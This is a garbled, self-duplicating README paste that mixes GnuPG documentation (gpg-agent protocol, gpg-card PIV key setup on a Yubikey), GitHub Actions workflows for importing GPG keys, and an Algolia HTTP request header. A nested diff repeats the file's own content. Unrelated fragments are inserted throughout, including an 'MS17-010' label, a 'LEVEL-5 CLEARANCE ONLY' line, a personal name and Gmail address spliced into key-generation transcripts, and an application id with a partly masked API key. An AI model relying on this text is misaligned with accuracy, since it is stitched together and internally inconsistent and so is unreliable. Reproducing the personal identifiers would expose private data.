       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/
gpg-connect-agent 'help COMMAND' /bye
SETKEY <keyGrip>
Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

  PKDECRYPT
The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

    S: INQUIRE CIPHERTEXT
    C: D (xxxxxx
    C: D xxxx)
    C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

     (enc-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

   C: PKDECRYPT
   S: INQUIRE CIPHERTEXT
   C: D (enc-val elg (a 349324324)
   C: D    (b 3F444677CA)))
   C: END
   S: # session key follows
   S: S PADDING 0
   S: D (value 1234567890ABCDEF0)
   S: OK decryption successful
The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
SIGKEY <keyGrip>
This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

   SETHASH --hash=<name>|<algo> <hexstring>
sig-val
       (<algo>
         (<param_name1> <mpi>)
 	   ...
         (<param_namen> <mpi>)))
The operation is affected by the option

   OPTION use-cache-for-signing=0|1
The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

   C: SIGKEY <keyGrip>
   S: OK key available
   C: SIGKEY <keyGrip>
   S: OK key available
   C: PKSIGN
   S: # I did ask the user whether he really wants to sign
   S: # I did ask the user for the passphrase
   S: INQUIRE HASHVAL
   C: D ABCDEF012345678901234
   C: END
   S: # signature follows
   S: D (sig-val rsa (s 45435453654612121212))
   S: OK
  GENKEY [--no-protection] [--preset] [<cache_nonce>]
Invokes the key generation process and the server will then inquire on the generation parameters, like:

   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
The format of the key parameters which depends on the algorithm is of the form:

    (genkey
      (algo
        (parameter_name_1 ....)
          ....
        (parameter_name_n ....)))
If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:

     (public-key
       (rsa
 	 (n <mpi>)
 	 (e <mpi>)))
Here is an example session:

   C: GENKEY
   S: INQUIRE KEYPARM
   C: D (genkey (rsa (nbits  1024)))
   C: END
   S: D (public-key
   S: D   (rsa (n 326487324683264) (e 10001)))
   S  OK key created
    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
LISTTRUSTED
GpgAgent returns a list of trusted keys line by line:

    S: D 000000001234454556565656677878AF2F1ECCFF P
    S: D 340387563485634856435645634856438576457A P
    S: D FEDC6532453745367FD83474357495743757435D S
    S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
Ok
Finally a client should be able to mark a key as trusted:

   MARKTRUSTED fingerprint "P"|"S"
The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

   S: INQUIRE TRUSTDESC
   C: D Do you trust the key with the fingerprint @FPR@
   C: D bla fasel blurb.
   C: END
   S: OK
GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
                 [--qualitybar] cache_id                \
                 [error_message prompt description]
PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]

HAVEKEY keygrips
  GET_CONFIRMATION description
  LEARN [--send]
UPDATESTARTUPTTY
SETDATA hexstring


  PKSIGN keyid


  PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid
READKEY hexified_certid
SETDATA hexstring
d

  PKSIGN keyid
 LEARN

  PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid
WRITEKEY [--force] keyid
PASSWD [--reset] [--nullpin] chvno
CHECKPIN idstr
APDU [--atr] [--more] [--exlen[=n]] [hexstring]
this:

     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import 

command --locate-external-key
command --locate-external-key
github/workflows/release.yml:
ldap://keys.(thedomain)
‘--auto-key-locate
 --auto-key-locate
--auto-key-retrieve


 honor-keyserver-url 

-sig-keyserver-url
--recv-key
honor-keyserver-url
--use-agent
--gpg-agent-info


--no-random-seed-file
Host: c7-use-3.algolianet. com
Accept: */*
Sec-Fetch-Site: cross-site
Accept-Language: en-US, en; q=0.9
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
Origin: https://dashboard.algolia.com
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
x-algolia-api-key: b3cf*************************米**
Content-Length: 27
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty

scdaemon.conf
1
HKCU\Software\GNU\GnuPG:DefaultLogFile,
--debug-level level
HKCU\Software\GNU\GnuPG:DefaultLogFile,
scd-event
HKCU\Software\GNU\GnuPG:HomeDir
HKCU\Software\GNU\GnuPG:DefaultLogFile,
reader_n.status
HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file
gpg-agent.conf
HKCU\Software\GNU\GnuPG:HomeDir
name: release
debug-pinentry 
--debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards
Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
gpg-connect-agent updatestartuptty /bye
Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye
--scdaemon-program filename
Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
--check-passphrase-pattern file
--check-sym-passphrase-pattern file
Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
Keys listed in the sshcontrol file
--disable-extended-key-format
These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support
--enable-win32-openssh-support
--enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye
gpg-connect-agent 'GETINFO s2k_time' /bye
To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye
--ssh-fingerprint-digest
Keys listed in the sshcontrol file

Active card
gpg-connect-agent /bye
bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty)
export GPG_TTY
--daemon [command line]
server

agent-program file ¶
Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file
Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file
Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid
Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card
AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
AUTH
FETCH
GENERATE [--force] [--algo=algo{+algo2}] keyref
KDF-SETUP ¶
Prepare the OpenPGP card KDF feature for this card.

LANG [--clear]
Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
NAME [--clear]
PRIVATEDO [--clear] n [< file] file
READCERT [--openpgp] certref > file ¶
Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
URL [--clear]
gpg's. --fetch 
WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
 --openpgp
file 
fpr.
WRITEKEY [--force] keyref keygrip ¶
Write a private key object identified by keygrip to the card under the id keyref.
CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
Serial number
A hex-string with the serial number of the card.

Type
This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip
A hex-string identifying a key.

Keyref
The application slot where the key is stored on the card. For example "OpenPGP.1"

Status
The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV Application PIN
This is the string 123456.

PIN Unblocking Key
This is the string 12345678.
list (the string gpg/card>
card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]
on:
  push:
    tags:
      - "v*"

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: cli/gh-extension-precompile@v1
        with:
          go_version: "1.16"
Then
- uses: cli/gh-extension-precompile@v1
  env:
    CGO_ENABLED: 1
- uses: cli/gh-extension-precompile@v1
  with:
    build_script_override: "script/build.sh"
name: release

on:
  push:
    tags:
      - "v*"

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - id: import_gpg
        uses: crazy-max/ghaction-import-gpg@v5
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.GPG_PASSPHRASE }}
      - uses: cli/gh-extension-precompile@v1
        with:
          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
# macOS
gpg --armor --export-secret-key joe@foo.bar | pbcopy

# Ubuntu (assuming GNU base64)
gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

# Arch
gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

# FreeBSD (assuming BSD base64)
gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on:
  push:
    branches: master

jobs:
  import-gpg:
    runs-on: ubuntu-latest
    steps:
      -
        name: Checkout
        uses: actions/checkout@v4
      -
        name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.PASSPHRASE }}
      -
        name: List keys
        run: gpg -K
name: import-gpg

on:
  push:
    branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

jobs:
  import-gpg:
    runs-on: ubuntu-latest
    steps:
      -
        name: Checkout
        uses: actions/checkout@v4
      -
        name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.PASSPHRASE }}
          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
      -
        name: List keys
        run: gpg -K

pub   ed25519 2021-09-24 [C]
      87F257B89CE462100BEC0FFE6071D218380FDCC8
      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
uid           [ unknown] Joe Bar <joe@bar.foo>
sub   ed25519 2021-09-24 [S]
      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
name: import-gpg
/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv
to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
list --cards
well. The PIV authentication key (internal reference PIV.9A
Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708
gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected
 ‘--force’
gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D
keygrip
gpg
self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1
gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D
keygrip 
gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <6309304695z@gmail.com>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> 6309304695z@gmail.com
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

‘gpgsm --learn’
Digital signature’ key
gpg-card:

gpg/card> writecert PIV.9C < sign.crt
# MS17-010
# 000006
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE722

diff --git a/ReadMe.md b/ReadMe.md
index 9f10a05..2888fcd 100644
--- a/ReadMe.md
+++ b/ReadMe.md
@@ -1,3 +1,1210 @@
+diff --git a/ReadMe.md b/ReadMe.md
+index 7278f80..41b298d 100644
+--- a/ReadMe.md
++++ b/ReadMe.md
+@@ -709,7 +709,844 @@ Digital signature’ key
+ gpg-card:
+ 
+ gpg/card> writecert PIV.9C < sign.crt
++# MS17-010
++# 000006
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - [verified] -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.co
++ m>
++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++      keyref .....: PIV.9D  (encr)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.com>
++ PIV authentication’ key with ssh:
++
++$ ssh-add -l
++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
++ssh-add with the uppercase ‘-L
++$ gpgsm --learn
++$ gpg --full-gen-key
++Please select what kind of key you want:
++   (1) RSA and RSA (default)
++   (2) DSA and Elgamal
++   (3) DSA (sign only)
++   (4) RSA (sign only)
++  (14) Existing key from card
++Your selection? 14
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
++Your selection? 3
++Please specify how long the key should be valid.
++         0 = key does not expire
++      <n>  = key expires in n days
++      <n>w = key expires in n weeks
++      <n>m = key expires in n months
++      <n>y = key expires in n years
++Key is valid for? (0)
++Key does not expire at all
++Is this correct? (y/N) y
++
++GnuPG needs to construct a user ID to identify your key.
++
++Real name: keith bieszczat
++Email address: 6309304695z@gmail.com
++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
++You selected this USER-ID:
++    "6309304695z@gmail.com"
++
++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
++gpg: key C3AFA9ED971BB365 marked as ultimately trusted
++gpg: revocation certificate stored as '[...]D971BB365.rev'
++public and secret key created and signed.
++
++Note that this key cannot be used for encryption.  You may want to use
++the command "--edit-key" to generate a subkey for this purpose.
++pub   rsa2048 2019-04-04 [SC]
++      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
++uid                      6309304695z@gmail.com
++
++ run gpg in --expert mode
++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
++Secret key is available.
++
++sec  rsa2048/C3AFA9ED971BB365
++     created: 2019-04-04  expires: never       usage: SC
++     card-no: FF020001008A77C1
++     trust: ultimate      validity: ultimate
++[ultimate] (1). otto@example.net
++gpg> addkey
++Secret parts of primary key are stored on-card.
++Please select what kind of key you want:
++   (3) DSA (sign only)
++   (4) RSA (sign only)
++   (5) Elgamal (encrypt only)
++   (6) RSA (encrypt only)
++  (14) Existing key from card
++Your selection? 14
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
++Your selection? 4
++Please specify how long the key should be valid.
++         0 = key does not expire
++      <n>  = key expires in n days
++      <n>w = key expires in n weeks
++      <n>m = key expires in n months
++      <n>y = key expires in n years
++Key is valid for? (0)
++Key does not expire at all
++Is this correct? (y/N) y
++Really create? (y/N) y
++
++sec  rsa2048/C3AFA9ED971BB365
++     created: 2019-04-04  expires: never       usage: SC
++     card-no: FF020001008A77C1
++     trust: ultimate      validity: ultimate
++ssb  rsa2048/7067860A98FCE6E1
++     created: 2019-04-04  expires: never       usage: E
++     card-no: FF020001008A77C1
++[ultimate] (1). otto@example.net
++
++gpg> save
++ 
++/* 32A19-D90712   
++LEVEL-5 CLEARANCE ONLY
++ ‘--force’
++authentication key 
++-header-'010203040506070801020304050607080102030405060708'
++SETDATA hexstring
++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
++
++  PKSIGN keyid
++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
++
++  PKSIGN --hash=algoname keyid
++READKEY hexified_certid
++READCERT hexified_certid|keyid
++SERIALNO
++Return the serial number of the card using a status response like:
++
++  S SERIALNO D27600000000000000000000
++ WRITEKEY [--force] keyid
++SETDATA hexstring
++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
++
++  PKDECRYPT keyid
++CHECKPIN idstr
++RESTART
++APDU [--atr] [--more] [--exlen[=n]] [hexstring]
++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
++
++./configure --sysconfdir=/etc --localstatedir=/va
++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
++  A6935DD34EF3087973C706FC311AA2CCF733765B S
++
++  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
++  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
++
++  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
++  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
++  
++       # Key added on: 2011-07-20 20:38:46
++       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
++       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
++private-keys-v1.d/
++gpg-connect-agent 'help COMMAND' /bye
++SETKEY <keyGrip>
++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
++
++  PKDECRYPT
++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
++
++    S: INQUIRE CIPHERTEXT
++    C: D (xxxxxx
++    C: D xxxx)
++    C: END
++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
++
++     (enc-val
++       (<algo>
++         (<param_name1> <mpi>)
++     ...
++         (<param_namen> <mpi>)))
++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
++
++If the decryption was successful the decrypted data is returned by means of "D" lines.
++
++Here is an example session:
++
++   C: PKDECRYPT
++   S: INQUIRE CIPHERTEXT
++   C: D (enc-val elg (a 349324324)
++   C: D    (b 3F444677CA)))
++   C: END
++   S: # session key follows
++   S: S PADDING 0
++   S: D (value 1234567890ABCDEF0)
++   S: OK decryption successful
++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
++SIGKEY <keyGrip>
++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
++
++   SETHASH --hash=<name>|<algo> <hexstring>
++sig-val
++       (<algo>
++         (<param_name1> <mpi>)
++     ...
++         (<param_namen> <mpi>)))
++The operation is affected by the option
++
++   OPTION use-cache-for-signing=0|1
++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
++
++Here is an example session:
++
++   C: SIGKEY <keyGrip>
++   S: OK key available
++   C: SIGKEY <keyGrip>
++   S: OK key available
++   C: PKSIGN
++   S: # I did ask the user whether he really wants to sign
++   S: # I did ask the user for the passphrase
++   S: INQUIRE HASHVAL
++   C: D ABCDEF012345678901234
++   C: END
++   S: # signature follows
++   S: D (sig-val rsa (s 45435453654612121212))
++   S: OK
++  GENKEY [--no-protection] [--preset] [<cache_nonce>]
++Invokes the key generation process and the server will then inquire on the generation parameters, like:
++
++   S: INQUIRE KEYPARM
++   C: D (genkey (rsa (nbits  1024)))
++   C: END
++The format of the key parameters which depends on the algorithm is of the form:
++
++    (genkey
++      (algo
++        (parameter_name_1 ....)
++          ....
++        (parameter_name_n ....)))
++If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
++
